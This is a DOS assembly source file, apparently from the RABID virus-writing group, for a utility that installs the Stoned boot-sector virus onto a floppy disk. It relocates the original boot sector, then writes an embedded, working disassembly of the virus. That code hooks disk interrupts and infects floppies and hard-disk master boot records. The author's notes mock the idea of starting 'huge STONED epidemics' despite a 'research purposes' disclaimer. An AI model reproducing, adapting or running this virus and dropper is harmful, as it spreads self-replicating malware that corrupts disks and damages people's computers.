;*****************************************************************************
;                   MakeStoned v1.0
;*****************************************************************************
;
; Development Notes:
; ------------------
; (Feb.13.1990)
;
; Ok guys. Here it is. RABID's MakeStoned Utility. This program will 
; install the Stoned virus onto a 5.25" diskette. It took me a while to get
; it working, but I finally realised that it would be easiest to to 
; disassemble the COM file and then make it a PROCedure that will be written
; to the boot sector via INT 26 when BX points to the PROCedure STONEDVIR.
;
; Anyway, this utility can come in handy when installing other viruses onto
; floppies for research purposes.
;
; Have fun, and as always, keep this code RABID property. I think that we are
; now getting rather "higer profile" with releases such as this one. If this
; ever gets outside of RABID, we can get in alot of heat and be blamed for
; starting huge STONED epidemics. HAHAHA! That would be fun.
;
; BLOW IT OUT YOUR ASSES!!! Haha!
;
; See ya later guys...
;
;   -= The High Evolutionary =-
;
; BTW: Please don't mind the messy disassembled code in the STONEVIR
; procedure. I was too lazy to comment it, and I figure that if you have this,
; then it's most probable that you have the actual disassembly of the Stoned
; virus.
;
;*****************************************************************************
;
;           Written by The High Evolutionary
;
;       Copyright (C) 1991 by The RABID Nat'nl Development Corp.
;
;          "Keep this code out of reach of children..."
;
;*****************************************************************************

code_seg segment
    assume cs:code_seg,ds:code_seg,es:code_seg
    
    org 100h

start:  jmp main

;*****************************************************************************
; Some bullshit equates that are needed for the STONEDVIR procedure...
;*****************************************************************************

data_1e     equ 4Ch
data_2e     equ 4Eh
data_3e     equ 413h
data_4e     equ 43Fh
data_5e     equ 46Ch
data_6e     equ 7C00h
data_7e     equ 7C09h
data_8e     equ 7C0Bh
data_9e     equ 7C0Fh
data_10e    equ 0
data_11e    equ 8
data_12e    equ 9
data_13e    equ 0Dh
data_14e    equ 11h
data_18e    equ 3BEh
data_19e    equ 8050h

;*****************************************************************************
; Set up my macros here for ease's sake...
;*****************************************************************************

@disp   macro   string          
    mov dx,offset string
    mov ah,09h
    int 21h
endm

@exit   macro   
    mov ax,4c00h
    int 21h
endm

@cls    macro   mode
    mov ah,00h
    mov al,mode
    int 10h
endm

boot_area dw    256 dup (0)     ; Buffer where we will store the
                    ; original boot sector in Drive A:

ident   db  '                 MAKESTONED v1.0 - Written by The High Evolutionary',13,10
    db  '                   Property of The RABID Nat''nl Development Corp.',13,10
    db  '------------------------------------------------------------------------------',13,10
    db  ' ',13,10
    db  'THIS PROGRAM WILL INSTALL THE STONED VIRUS ONTO A 5.25 360k FLOPPY',13,10
    db  ' ',13,10
    db  '* Note:',13,10
    db  '  -----',13,10
    db  ' ',13,10
    db  '  This program will move the original boot sector located at track 0, side 0',13,10
    db  ' sector 1, and will move it to track 0, side 1, sector 3. It will then write',13,10
    db  ' track 0, side 0, sector 1 with the working copy of the Stoned virus',13,10
    db  ' ',13,10
    db  ' WARNING! DO NOT USE THIS PROGRAM MALICIOUSLY! FOR INTERNAL RESEARCH PURPOSES',13,10
    db  '          ONLY!',13,10
    db  ' ',13,10
    db  ' [Press any key to continue, or press CTRL-BREAK to bail out]',13,10
    db  ' ',13,10
    db  ' $',13,10

r_sec   db  'Reading in drive A:/sector 1/track 0/side 0               ',13,10
    db  ' $',13,10

w_sec   db  'Writing to drive A:/sector 3/track 0/side 1               ',13,10
    db  ' $',13,10

r_error db  'Error reading in boot sector in drive A:                  ',13,10
    db  ' $',13,10

w_error db  'Error relocating boot sector in drive A:                  ',13,10
    db  ' $',13,10

good_read db    'Successful read of boot sector                            ',13,10
    db  ' $',13,10

good_write db   'Successful write of boot sector                           ',13,10
    db  ' $',13,10

inst_stone db   'Installing Stoned virus onto diskette...                  ',13,10
    db  ' $',13,10

done_inst db    'Finished installing Stoned Virus. Have fun!               ',13,10
    db  ' $',13,10

inst_error db   'Error in installing Stoned virus onto diskette            ',13,10
    db  ' $',13,10

main:   @cls    3           ; Clear the screen in 80x25 mode
    @disp   ident           ; Print out the title screen
    mov ah,08h          ; Wait for a key
    int 21h         ; Call DOS

read_sec:
    call    goto
    @disp   r_sec
    mov ah,02h          ; Read in diskette
    mov al,1            ; Xfer 1 sector
    mov bx,offset boot_area ; Buffer to data
    mov ch,0            ; Track 0
    mov cl,1            ; Sector 1  
    mov dh,0            ; Head (Side) 0
    mov dl,0            ; Drive A:
    int 13h         ; Call BIOS
    jc  read_err        ; On error, say so...
    call    goto
    @disp   good_read           

write_sec:
    call    goto
    @disp   w_sec
    mov ah,03h          ; Write data from buffer
    mov al,1            ; Xfer 1 sector
    mov bx,offset boot_area ; Buffer to data
    mov ch,0            ; Track 0
    mov cl,3            ; Sector 3
    mov dh,1            ; Head (Side) 1
    mov dl,0            ; Drive A:
    int 13h         ; Call BIOS
    jc  write_error     ; Error? Then say so...
    call    goto
    @disp   good_write      ; Yippe! We did it!
    jmp ins_stoned

read_err:
    jmp read_error

goto:   mov ah,02h
    mov bh,00h
    mov dh,18
    mov dl,0
    int 10h
    ret

ins_stoned:
    call    goto
    @disp   inst_stone      ; Tell the guy we are going to install
                    ; the stoned virus
    pushf               ; Push all the flags becuase INT 26
                    ; destroys them
    mov al,0            ; Set for drive A:
    mov cx,1            ; Write 1 sector
    mov dx,0            ; Starting at sector 0
    mov bx,offset stonevir  ; Make buffer to PROC STONEVIR
    int 26h         ; Call BIOS to write the diskette
    popf                ; Restore the flags we pushed
    jnc good_install        ; If there's no error, then say so...
    call    goto
    @disp   inst_error      ; SHIT! Tell the guy we fucked up...
    @exit               ; Bail out

good_install:
    call    goto
    @disp   done_inst       ; Yay! We sucessfully installed STONED!
    @exit               ; Geddoudahere...

read_error:
    call    goto
    @disp   r_error         ; Display read error message
    @exit

write_error:
    call    goto
    @disp   w_error         ; Display write error message
    @exit   

;*****************************************************************************
;
; Here's where the actual stoned virus data is stored
;
;*****************************************************************************
 
stonevir    proc    far

stoned  proc    near
  
begin:
;*      jmp far ptr loc_1       ;*(07C0:0005)
        db  0EAh, 05h, 00h,0C0h, 07h
        jmp loc_8           ; (01A1)
        add [bx+si],al
        add [bx+si],al
        add ah,ah
        add [bx+si],al
        add [bx+si],al
        jl  loc_2           ; Jump if <
loc_2:
        add ds:data_19e,bl
        cld             ; Clear direction
        add dh,[bp+si+17h]
        cmp ah,4
        jae loc_3           ; Jump if above or =
        or  dl,dl           ; Zero ?
        jnz loc_3           ; Jump if not zero
        xor ax,ax           ; Zero register
        mov ds,ax
        mov al,ds:data_4e
        test    al,1
        jnz loc_3           ; Jump if not zero
        call    sub_1           ; (013A)
loc_3:
        pop ax
        pop ds
        jmp dword ptr cs:data_12e
  
stoned      endp
  
;��������������������������������������������������������������������������
;                  SUBROUTINE
;��������������������������������������������������������������������������
  
sub_1       proc    near
        push    bx
        push    cx
        push    dx
        push    es
        push    si
        push    di
        mov si,4
loc_4:
        mov ax,201h
        push    cs
        pop es
        mov bx,200h
        xor cx,cx           ; Zero register
        mov dx,cx
        inc cx
        pushf               ; Push flags
        call    dword ptr cs:data_12e
        jnc loc_5           ; Jump if carry=0
        xor ax,ax           ; Zero register
        pushf               ; Push flags
        call    dword ptr cs:data_12e
        dec si
        jnz loc_4           ; Jump if not zero
        jmp short loc_7     ; (019A)
        db  90h
loc_5:
        xor si,si           ; Zero register
        mov di,offset ds:[200h]
        cld             ; Clear direction
        push    cs
        pop ds
        lodsw               ; String [si] to ax
        cmp ax,[di]
        jne loc_6           ; Jump if not equal
        lodsw               ; String [si] to ax
        cmp ax,[di+2]
        je  loc_7           ; Jump if equal
loc_6:
        mov ax,301h
        mov bx,200h
        mov cl,3
        mov dh,1
        pushf               ; Push flags
        call    dword ptr cs:data_12e
        jc  loc_7           ; Jump if carry Set
        mov ax,301h
        xor bx,bx           ; Zero register
        mov cl,1
        xor dx,dx           ; Zero register
        pushf               ; Push flags
        call    dword ptr cs:data_12e
loc_7:
        pop di
        pop si
        pop es
        pop dx
        pop cx
        pop bx
        retn
sub_1       endp
  
loc_8:
        xor ax,ax           ; Zero register
        mov ds,ax
        cli             ; Disable interrupts
        mov ss,ax
        mov sp,7C00h
        sti             ; Enable interrupts
        mov ax,ds:data_1e
        mov ds:data_7e,ax
        mov ax,ds:data_2e
        mov ds:data_8e,ax
        mov ax,ds:data_3e
        dec ax
        dec ax
        mov ds:data_3e,ax
        mov cl,6
        shl ax,cl           ; Shift w/zeros fill
        mov es,ax
        mov ds:data_9e,ax
        mov ax,15h
        mov ds:data_1e,ax
        mov ds:data_2e,es
        mov cx,1B8h
        push    cs
        pop ds
        xor si,si           ; Zero register
        mov di,si
        cld             ; Clear direction
        rep movsb           ; Rep when cx >0 Mov [si] to es:[di]
        jmp dword ptr cs:data_13e
        mov ax,0
        int 13h         ; Disk  dl=drive a  ah=func 00h
                        ;  reset disk, al=return status
        xor ax,ax           ; Zero register
        mov es,ax
        mov ax,201h
        mov bx,data_6e
        cmp byte ptr cs:data_11e,0
        je  loc_9           ; Jump if equal
        mov cx,7
        mov dx,80h
        int 13h         ; Disk  dl=drive 0  ah=func 02h
                        ;  read sectors to memory es:bx
        jmp short loc_12        ; (024E)
        db  90h
loc_9:
        mov cx,3
        mov dx,100h
        int 13h         ; Disk  dl=drive a  ah=func 02h
                        ;  read sectors to memory es:bx
        jc  loc_12          ; Jump if carry Set
        test    byte ptr es:data_5e,7
        jnz loc_11          ; Jump if not zero
        mov si,offset ds:[189h]
        push    cs
        pop ds
loc_10:
        lodsb               ; String [si] to al
        or  al,al           ; Zero ?
        jz  loc_11          ; Jump if zero
        mov ah,0Eh
        mov bh,0
        int 10h         ; Video display   ah=functn 0Eh
                        ;  write char al, teletype mode
        jmp short loc_10        ; (021D)
loc_11:
        push    cs
        pop es
        mov ax,201h
        mov bx,offset ds:[200h]
        mov cl,1
        mov dx,80h
        int 13h         ; Disk  dl=drive 0  ah=func 02h
                        ;  read sectors to memory es:bx
        jc  loc_12          ; Jump if carry Set
        push    cs
        pop ds
        mov si,offset ds:[200h]
        mov di,data_10e
        lodsw               ; String [si] to ax
        cmp ax,[di]
        jne loc_13          ; Jump if not equal
        lodsw               ; String [si] to ax
        cmp ax,[di+2]
        jne loc_13          ; Jump if not equal
loc_12:
        mov byte ptr cs:data_11e,0
        jmp dword ptr cs:data_14e
loc_13:
        mov byte ptr cs:data_11e,2
        mov ax,301h
        mov bx,offset ds:[200h]
        mov cx,7
        mov dx,80h
        int 13h         ; Disk  dl=drive 0  ah=func 03h
                        ;  write sectors from mem es:bx
        jc  loc_12          ; Jump if carry Set
        push    cs
        pop ds
        push    cs
        pop es
        mov si,data_18e
        mov di,offset ds:[1BEh]
        mov cx,242h
        rep movsb           ; Rep when cx >0 Mov [si] to es:[di]
        mov ax,301h
        xor bx,bx           ; Zero register
        inc cl
        int 13h         ; Disk  dl=drive 0  ah=func 03h
                        ;  write sectors from mem es:bx
        jmp short loc_12        ; (024E)
        db  7
        db  'Your PC is now Stoned!'
        db   07h, 0Dh, 0Ah, 0Ah, 00h
        db  'LEGALISE MARIJUANA!'
        db   02h, 04h, 68h, 02h, 68h, 02h
        db   0Bh, 05h, 67h, 02h
  

stonevir    endp
    
    code_seg    ends
end     start

  